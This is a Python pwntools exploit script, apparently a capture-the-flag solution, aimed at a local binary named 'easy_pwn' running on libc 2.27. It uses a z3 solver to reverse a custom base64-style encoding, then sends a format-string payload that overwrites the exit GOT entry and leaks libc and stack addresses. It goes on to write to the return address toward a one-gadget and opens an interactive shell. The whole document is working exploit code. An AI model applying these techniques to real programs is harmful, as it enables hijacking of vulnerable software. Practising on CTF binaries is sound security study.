from re import M
from z3 import *
from pwn import *
from LibcSearcher import *

destring='7M9BXCGPswHRFxvbdaNgyVilEmpD/foYhTznK6Lkj5A+t3W20reUZO18QcSqJI4u'
def de(aa,bb,cc):
    a=Int('a')
    b=Int('b')
    c=Int('c')
    d=Int('d')
    s=Solver()
    # print('here')
    s.add(a>=0 , a < 64)
    s.add(b>=0 , b < 64)
    s.add(c>=0 , c < 64)
    s.add(d>=0 , d < 64)
    s.add(aa==(4*a+(b-b%16)/16)%256)
    s.add((16*b+ (c-c%4)/4)%256==bb)
    s.add(cc==(d+64*c)%256)
    print(s.check())
    print(s.model())
    m=s.model()
    # print(m['a'])
    # print(m['a'].as_long(),m['b'].as_long(),m['c'].as_long(),m['d'].as_long())
    # print(m[a])
    # # print((chr(m[a])+chr(m[b])+chr(m[c])+chr(m[d])).encode())
    # print(m[a],m[b],m[c],m[d])
    return m.eval(a),m.eval(b),m.eval(c),m.eval(d)
def realpayload(payload):
    payload=payload.ljust(len(payload)+len(payload)%3,b'a').decode()
    print(payload)
    ans=b''
    for i in range(len(payload)//3):
        print(ord(payload[3*i]),ord(payload[3*i+1]),ord(payload[3*i+2]))
        m=de(ord(payload[3*i]),ord(payload[3*i+1]),ord(payload[3*i+2]))
        # print(m[0].as_long(),m[1].as_long(),m[2].as_long(),m[3].as_long())
        ans+=destring[m[0].as_long()].encode()+destring[m[1].as_long()].encode()+destring[m[2].as_long()].encode()+destring[m[3].as_long()].encode()
    # print(ans)
    return ans
    
def findloc(c):
    return destring.find(c)

context.log_level = 'debug' 
p=process('./easy_pwn')
elf=ELF('./easy_pwn')
libc=ELF('./libc-2.27.so')
p.recvuntil(b'tell me your name\n')
setbuf_got=elf.got['setbuf']
exit_got=elf.got['exit']
execve=0x4f2c5
# 0x4f322
# 0x10a38c
# exit.got 12
payload=b'%1782c%13$hnbb%31$pcc%34$pdd'
# bugfun=0x0000000000400B79
realpay=realpayload(payload)
pause()
p.sendline(realpay.ljust(0x28,b'\x00')+p64(exit_got))
p.recvuntil(b'your name is \n')
p.recvuntil(b'bb')
puts_addr=int(p.recv(14),16)-418
p.recvuntil(b'cc')
ret_addr=int(p.recv(14),16)+8
print(hex(puts_addr))
print(hex(ret_addr))
libcbase=puts_addr-libc.sym['puts']
print(hex(libcbase))
# print(p.recvuntil(b'dd'))
p.recvuntil(b'this is a gift for you\n')

# p.interactive()
p.send(p64(ret_addr+1))
p.send(b'\x1a')
p.send(p64(ret_addr))
p.send(b'\xb0')
p.send(p64(ret_addr))
p.send(b'\xb0')
p.interactive()